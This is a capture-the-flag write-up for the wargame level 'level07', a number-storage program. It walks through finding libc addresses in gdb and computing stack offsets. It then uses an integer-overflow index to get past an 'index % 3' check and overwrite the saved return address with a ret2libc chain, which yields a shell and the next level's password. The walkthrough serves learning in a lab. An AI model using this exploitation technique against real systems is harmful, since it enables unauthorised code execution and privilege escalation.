level07

----- CAT -----

level06

----- CAT - STRINGS -----

We can see the inputs command for went we exec.

 Number:
 Index:
 *** ERROR! ***
   This index is reserved for wil!
 Number at data[%u] is %u
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------
Input command:
store
read
quit
Failed to do %s command
Completed %s command successfully

----- EXEC -----

the input ask for a command then we can choice a number for number and index 
we observe that we cant add multiple of 3 because this index is reserved for wil..

we have this functions: 

0x080485c4  clear_stdin
0x080485e7  get_unum
0x0804861f  prog_timeout
0x08048630  store_number
0x080486d7  read_number
0x08048723  main

Now try a ret2libc. Need the addresses of system(), exit() and a "/bin/sh".

info function exit
0xf7e5eb70 = 4159040368

info function system
0xf7e6aed0 = 4159090384 

we go to write the EIP with the address system go to check for the function:

find __libc_start_main,+99999999,"/bin/sh"
0xf7f897ec = 4160264172

go and check for the index so we can pass all the values on the store passing trought the tab[100];
with radare we see that the value is stocked in a int32_t edx[100] go and search this address dans le stack:
we go to check the EIP address, lets breakpoint main in the call read_number and run:

0x0804892b <+520>:   call   0x80486d7 <read_number>

b *0x0804892b

run
Input command: read

i registers 

ebx 0xffffd544 adress's tab[100]
esp 0xffffd520 address that stock tab[100]

0xffffd520 - 0xffffd544 = -0x24 === p -36 

to get the value we divide for 4 because is a int

-36 / 4 = -9

so now we have the index let run again

Index: -9
Number at data[4294967287] is 4294956356
Completed read command successfully

4294956356 === 0xffffd544 

us we can see we have access to tab[100]

i frame
Stack level 0, frame at 0xffffd710:
eip = 0x804892b in main; saved eip 0xf7e45513
Arglist at 0xffffd708, args:
Locals at 0xffffd708, Previous frame's sp is 0xffffd710
Saved registers:
ebx at 0xffffd6fc, ebp at 0xffffd708, esi at 0xffffd700, edi at 0xffffd704, eip at 0xffffd70c

with the tab[100] eip and the address lets check the eip index

EIP: 0xffffd70c
ebx 0xffffd544 adress's tab[100]

0xffffd70c - 0xffffd544 = 0x1C8 === 456
456/4 = 114 <--- index

re run and check the value again:

Input command: read
 Index: 114
 Number at data[114] is 4158936339
 Completed read command successfully

4158936339 = 0xf7e45513

runing again with the b on the call we can see that the eip 0xffffd70c is 0xf7e45513
at this point we just need to pass the protection index % 3

114 % 3 = 0 is multiple of 3 so the program go out directly 
we need to pass 114 without passing 114.

we now that the program take the value of 4 because is an int and this take 4 bytes on memory
we go to overflow the value for the index % 3

unsigned int . 4294967295 (0xffffffff)
  4294967295 / 4 = 1073741824
    1073741824 * 4 = 0 <--- so from here we go to add 114
      1073741824 + 114 = 1073741938

now that we can bypass trought the program we go to do the ret2libc.

Need the addresses of system(), exit() and a "/bin/sh"

Input command: store
  Number: 4159090384
  Index: 1073741938
  Completed store command successfully
Input command: store
  Number: 4159040368
  Index: 115
  Completed store command successfully
Input command: store
  Number: 4160264172
  Index: 116
  Completed store command successfully
Input command: quit
$ whoami
level08
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC

